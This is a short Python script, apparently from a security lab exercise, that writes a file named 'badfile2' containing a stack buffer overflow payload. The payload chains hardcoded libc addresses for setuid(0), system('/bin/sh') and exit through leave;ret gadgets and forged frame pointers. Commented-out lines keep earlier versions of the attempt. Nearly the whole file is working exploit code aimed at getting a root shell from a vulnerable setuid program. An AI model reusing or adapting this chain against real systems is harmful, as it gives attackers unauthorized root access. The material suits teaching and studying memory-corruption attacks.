#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(1000))

#A = 112
#ebp1 = 0xffffc9f4
#content[A:A+4] = (ebp1).to_bytes(4,byteorder='little')

#X = 116
#foo_addr = 0x565562ce
#content[X:X+4] = (foo_addr).to_bytes(4,byteorder='little')

#I = 116 + 16
#setuid_addr = 0xf7e99e30
#content[I:I+4] = (setuid_addr).to_bytes(4,byteorder='little')
#execv_addr = 0xf7e994b0
#content[I:I+4] = (execv_addr).to_bytes(4,byteorder='little')

#X = 116+12
#sh_addr = 0xffffd3fc       # The address of "/bin/sh"
#content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

#K = 116+20
#foo2_addr = 0xffffc988+8
#content[K:K+4] = (foo2_addr).to_bytes(4,byteorder='little')


#Y = 116+4
#system_addr = 0xf7e12420   # The address of system()
#content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
#myarg_addr = 0xffffde25
#content[Y:Y+4] = (myarg_addr).to_bytes(4,byteorder='little')


#J = 116+24
#zero = 0x00000000
#content[J:J+4] = (zero).to_bytes(4,byteorder='little')



#Z = 116+8
#exit_addr = 0xf7e04f80     # The address of exit()
#content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')



#M = 40+40
#input_addr = 0xffffcdf0 + K
#content[M:M+4] = (input_addr).to_bytes(4,byteorder='little')

buffer = 0xffffc918

str_offset = 144

index = 112

chunk = 20

up = buffer + index + chunk*3
leaveret = 0x565562ce
next_ebp = buffer + index + chunk*2
system = 0xf7e12420
exit = 0xf7e04f80
sh = 0xffffd3fc
down = buffer + index + chunk*1
setuid = 0xf7e99e30
zero = 0x00000000

l1 = [up, leaveret]
l2 = [next_ebp, system, leaveret, sh]
l3 = [next_ebp, exit]
l4 = [down, setuid, leaveret, zero, zero]

lis = [l1, l2, l3, l4]

for l in lis:
	offset = 0
	for i in l:
		content[index+offset: index+offset+4] = i.to_bytes(4,byteorder='little')
		offset += 4
	index += chunk

content[index: ] = bytearray(0x00 for i in range(1000))
#0
#leaveret
#setuid
#down
#sh
#exit
#system
#leaveret
#up


# Save content to a file
with open("badfile2", "wb") as f:
  f.write(content)
